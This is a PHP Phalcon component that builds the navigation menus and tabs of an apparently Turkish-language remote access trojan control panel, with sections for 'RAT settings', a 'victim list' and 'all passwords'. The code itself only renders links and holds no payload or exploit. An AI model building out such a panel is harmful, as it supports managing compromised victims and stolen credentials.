<?php

use Phalcon\Mvc\User\Component;

/**
 * Elements
 *
 * Helps to build UI elements for the application
 */
class Elements extends Component
{
    
    private $_headerMenu = array(
        'navbar-left' => array(
            'index' => array(
                'caption' => 'Anasayfa',
                'action' => 'index'
            ),
            'islemler' => array(
                'caption' => 'İşlemler',
                'action' => 'index'
            ),
            'r4t' => array(
            'caption' => 'r4t Ayarları',
            'action' => 'index',
            ),
            'hesap' => array(
            'caption' => 'Hesap Ayarları',
            'action' => 'index'
            ),
            'admin' => array(
                'caption' => 'Yönetim Paneli',
                'action' => 'index'
            ),
            'hakkinda' => array(
                'caption' => 'Hakkında',
                'action' => 'index'
            ),
            'iletisim' => array(
                'caption' => 'İletişim',
                'action' => 'index'
            ),
        ),
        'navbar-right' => array(
            'oturum' => array(
                'caption' => 'Giriş Yap / Kayıt Ol',
                'action' => 'index'
            ),
        )
    );

    private $_tabs = array(
        'kurbanlar' => array(
            'caption' => 'Kurban Listesi',
            'action' => 'index',
            'any' => false
        ),
        'companies' => array(
            'caption' => 'Tüm Şifreler',
            'action' => 'index',
            'any' => true
        ),
        'products' => array(
            'caption' => 'l33t',
            'action' => 'index',
            'any' => true
        ),
            'r4t' => array(
            'caption' => 'r4t Ayarları',
            'action' => 'index',
            'any' => true
        ),
        'hesap' => array(
            'caption' => 'Hesap Ayarları',
            'action' => 'profile',
            'any' => false
        )
    );

    /**
     * Builds header menu with left and right items
     *
     * @return string
     */
    public function getMenu()
{
    $lang=$this->translation;
    foreach($this->_headerMenu as $hmenukey => $hmenu){
    foreach($hmenu as $hkey=>$hval){
    $this->_headerMenu[$hmenukey][$hkey]['caption']=$lang->_($hkey);
    }
    }
        $auth = $this->session->get('auth');
        if ($auth) {
            $this->_headerMenu['navbar-right']['oturum'] = array(
                'caption' => $lang->_('logout'),
                'action' => 'bitir'
            );

        } else {
            unset($this->_headerMenu['navbar-left']['islemler']);
            unset($this->_headerMenu['navbar-left']['r4t']);
            unset($this->_headerMenu['navbar-left']['hesap']);
        }

        $controllerName = $this->view->getControllerName();
        foreach ($this->_headerMenu as $position => $menu) {
            echo '<div class="nav-collapse">';
            echo '<ul class="nav navbar-nav ', $position, '">';
            foreach ($menu as $controller => $option) {
                if ($controllerName == $controller) {
                    echo '<li class="active">';
                } else {
                    echo '<li>';
                }
                if ($controller=='admin'){
                if(($auth) and ($auth['auth']==0)){
                 echo $this->tag->linkTo($controller . '/' . $option['action'], $option['caption']);
            }}else{
                echo $this->tag->linkTo($controller . '/' . $option['action'], $option['caption']);
                }
                echo '</li>';
            }

            echo '</ul>';
            echo '</div>';
        }

    }

    /**
     * Returns menu tabs
     */
    public function getTabs()
    {
            $lang=$this->translation;
    foreach($this->_tabs as $tabkey=>$tabval){
    $this->_tabs[$tabkey]['caption']=$lang->_($tabkey);
    }
        $controllerName = $this->view->getControllerName();
        $actionName = $this->view->getActionName();
        echo '<ul class="nav nav-tabs">';
        foreach ($this->_tabs as $controller => $option) {
            if ($controller == $controllerName && ($option['action'] == $actionName || $option['any'])) {
                echo '<li class="active">';
            } else {
                echo '<li>';
            }
            echo $this->tag->linkTo($controller . '/' . $option['action'], $option['caption']), '</li>';
        }
        echo '</ul>';
    }
}
